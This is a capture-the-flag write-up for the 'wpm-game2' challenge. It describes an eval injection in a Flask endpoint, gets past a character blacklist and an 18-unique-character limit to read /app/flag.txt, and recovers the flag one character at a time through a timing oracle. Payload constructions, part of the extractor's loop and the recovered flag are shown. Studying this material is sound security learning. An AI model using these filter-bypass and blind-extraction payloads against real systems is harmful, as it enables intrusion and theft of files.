# wpm-game2


<img width="480" height="430" alt="image" src="https://github.com/user-attachments/assets/47f200a5-be71-4889-b5bb-f0854127e5a6" />

## Summary

The `/rate` endpoint evaluated the user-controlled `wpm` parameter with Python's `eval`, but rejected many useful tokens and allowed at most 18 distinct characters. Unlike the first WPM challenge, production mode hid exception output. I built expressions using a very small alphabet, read `/app/flag.txt`, and converted the result into a blind timing oracle that recovered the flag one character at a time.

## The vulnerable endpoint

The application performed its filter and then evaluated the result directly:

```python
@app.route("/rate")
def rate_wpm():
    wpm = request.args.get("wpm", "")
    if check(wpm):
        return "Invalid WPM!"
    return jsonify(verdict=rate(eval(wpm.lower())), wpm=float(wpm))
```

The blacklist included quotes, dots, underscores, slashes, commas, `import`, `chr`, `str`, `int`, `globals`, and many other convenient primitives. It also rejected any payload satisfying:

```python
len(set(string)) > 18
```

The vulnerability was still exploitable because identifiers such as `open`, `next`, `bytes`, and `type` survived. Digits could be represented using only `1`, `2`, `+`, `*`, and parentheses, keeping the unique-character count low.

## Constructing strings without quotes

I generated compact arithmetic expressions for every required integer. For example, instead of writing an ASCII value directly, the solver finds a short expression composed from `1` and `2`. A path can then be assembled as a sequence of one-byte lists:

```python
bytes([47]+[97]+[112]+[112]+[47]+[102]+[108]+[97]+[103]+[46]+[116]+[120]+[116])
```

The actual solver replaces each decimal literal with its small-alphabet arithmetic representation. Python's `open` accepts a bytes path, so the file could be read with:

```python
next(open(bytes(...)))
```

This returns the first line of `/app/flag.txt` as a Python string.

## Building a character comparison

Quotes could not be used to express a candidate character. I instead created a one-byte `bytes` object and converted it using the type of the flag:

```python
type(flag)(bytes([candidate_value]))
```

For a candidate such as `c`, this produces the string `"b'c'"`; index 2 is the original character. A test for one position was therefore equivalent to:

```python
flag[index] is type(flag)(bytes([candidate_value]))[2]
```

For these single-character strings, the identity comparison worked because CPython interns the relevant one-character strings. The expression contains no literal quotes, dot access, or forbidden conversion function.

## Turning the comparison into a timing oracle

With debug output disabled, a correct guess needed an observable side effect. I used the Boolean result as a multiplier in the exponent of an expensive calculation:

```python
(1+1+1)**((2**22) * condition)
```

If the guess was false, the exponent became zero and the request returned quickly. If it was true, Python computed `3 ** (2 ** 22)`, which was noticeably slower before the endpoint eventually produced its generic error response.

Calibration against the known prefix gave approximately:

```text
false guess: 0.4 seconds
true guess:  1.9 seconds
```

I used the midpoint as the threshold. To reduce requests, the extractor tested two candidate characters at once by adding their Boolean comparisons. When a pair produced the slow response, it tested the first character again to decide which member matched.

## Extractor

The complete extractor is [solve.py](solve.py). Its core loop is:

```python
flag = "scriptCTF{"
while not flag.endswith("}"):
    index = len(flag)
    found = None
    for start in range(0, len(ALPHABET), 2):
        pair = ALPHABET[start:start + 2]
        if measure(session, index, pair) > threshold:
            if len(pair) == 1 or measure(session, index, pair[0]) > threshold:
                found = pair[0]
            else:
                found = pair[1]
            break
    if found is None:
        raise RuntimeError(f"character {index} was not in the candidate alphabet")
    flag += found
    print(flag, flush=True)
```

Every generated payload asserts that its lowercased form contains no more than 18 unique characters before it is sent. The candidate alphabet was restricted to the characters expected in a scriptCTF flag:

```text
_0123456789abcdefghijklmnopqrstuvwxyz}
```

The recovered output ended with:

```text
scriptCTF{r3v3ng3_1337_0626be7e5a1e}
```

## Flag

```text
scriptCTF{r3v3ng3_1337_0626be7e5a1e}
```
